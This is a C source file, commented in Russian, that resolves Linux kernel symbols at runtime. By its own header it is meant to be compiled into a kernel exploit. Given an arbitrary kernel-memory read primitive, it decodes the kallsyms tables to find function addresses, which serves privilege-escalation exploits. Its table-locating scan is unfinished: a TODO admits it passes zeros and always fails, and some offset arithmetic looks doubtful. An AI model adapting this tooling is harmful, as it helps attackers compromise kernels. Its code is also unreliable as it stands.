/*
 * kallsyms.c — рантайм-резолвер символов ядра (см. kallsyms.h).
 * Скомпилировать можно и в юзерспейсе (заглушка rd64), и в самом эксплойте.
 */
#include "kallsyms.h"
#include <string.h>

static uint8_t  rd8 (const kread_t *k, uint64_t a){ return (uint8_t)(k->rd64(a) & 0xff); }
static uint16_t rd16(const kread_t *k, uint64_t a){ return (uint16_t)(k->rd64(a) & 0xffff); }
static uint32_t rd32(const kread_t *k, uint64_t a){ return (uint32_t)(k->rd64(a) & 0xffffffffu); }
static int32_t  rds32(const kread_t *k, uint64_t a){ return (int32_t)(uint32_t)k->rd64(a); }

/* имя символа #idx: length-byte + токены token_index[]->token_table.
 * (порядок как в kernel/kallsyms.c 4.9; при расхождении — правится тут) */
int kallsyms_expand(const kallsyms_t *ks, const kread_t *k, unsigned idx, char *out, int outlen) {
    unsigned start = idx & ~0xffu;
    uint64_t p = ks->names;
    if (start) p += rd32(k, ks->markers + 4 * (start >> 8));   /* markers: смещение в names */
    for (unsigned i = start; i < idx; i++) {
        uint8_t l = rd8(k, p);
        if (l & 0x80) p += 2; else p += 1;
        p += (l & 0x7f) + ((l & 0x80) ? (rd8(k, p + 1) << 7) : 0);
    }
    uint8_t len = rd8(k, p);
    p += 1;
    int o = 0, first = 1;
    for (int i = 0; i < len; i++) {
        uint8_t t = rd8(k, p + i);
        uint16_t ti = rd16(k, ks->token_index + 2 * t);
        uint64_t s = ks->token_table + ti;
        for (;;) {
            char c = (char)rd8(k, s++);
            if (!c) break;
            if (first) { first = 0; continue; }        /* первый символ — тип символа */
            if (o < outlen - 1) out[o++] = c;
        }
    }
    out[o] = 0;
    return o;
}

uint64_t kallsyms_addr(const kallsyms_t *ks, const kread_t *k, unsigned idx) {
    if (ks->base_relative) {
        int32_t off = rds32(k, ks->offsets + 4 * idx);
        uint64_t rel = ks->relative_base ? k->rd64(ks->relative_base) : 0;
        return rel + off;
    }
    return k->rd64(ks->offsets + 8 * idx);
}

uint64_t kallsyms_lookup(const kallsyms_t *ks, const kread_t *k, const char *name) {
    char buf[128];
    size_t n = strlen(name);
    for (unsigned i = 0; i < ks->nsyms; i++) {
        kallsyms_expand(ks, k, i, buf, sizeof(buf));
        if (strlen(buf) == n && !memcmp(buf, name, n))
            return kallsyms_addr(ks, k, i);
    }
    return 0;
}

/* --- локатор (эвристика): ищем token_table — 256 NUL-terminated printable-строк --- */
static int looks_like_token_table(const kread_t *k, uint64_t a, uint64_t end, int *total_len) {
    uint64_t p = a;
    for (int i = 0; i < 256; i++) {
        int l = 0;
        for (;;) {
            if (p >= end) return 0;
            char c = (char)rd8(k, p++);
            if (!c) break;
            if (c < 0x20 || c > 0x7e) return 0;
            if (++l > 8) return 0;
        }
    }
    *total_len = (int)(p - a);
    return (*total_len > 200 && *total_len < 2048);
}

int kallsyms_locate_scan(kallsyms_t *ks, const kread_t *k, uint64_t start, uint64_t end) {
    for (uint64_t a = start; a + 16 < end; a += 2) {
        int tl;
        if (!looks_like_token_table(k, a, end, &tl)) continue;
        /* token_index — сразу за token_table (выровнен на 2) */
        uint64_t ti = a + ((tl + 1) & ~1);
        uint64_t tt = a;
        /* TODO: восстановить names/markers/num_syms/offsets/relative_base.
         * В 4.9 порядок в .rodata: offsets, relative_base, num_syms, names, markers,
         * token_table, token_index. Т.е. tt идёт после markers. Проверяем кандидатуры
         * сканом назад (см. kallsyms_set_tables с hint из приблизительного System.map). */
        (void)ti;
        return kallsyms_set_tables(ks, k, tt, ti, 0, 0, 0, 0, 0, 1) ? 0 : -2;
    }
    return -1;
}

int kallsyms_set_tables(kallsyms_t *ks, const kread_t *k,
                        uint64_t token_table, uint64_t token_index,
                        uint64_t names, uint64_t markers,
                        uint64_t num_syms, uint64_t offsets,
                        uint64_t relative_base, int base_relative) {
    (void)k;
    ks->token_table = token_table;
    ks->token_index = token_index;
    ks->names = names;
    ks->markers = markers;
    ks->num_syms = num_syms;
    ks->offsets = offsets;
    ks->relative_base = relative_base;
    ks->base_relative = base_relative;
    ks->nsyms = num_syms ? (unsigned)rd32(k, num_syms) : 0;
    return ks->names && ks->nsyms;
}
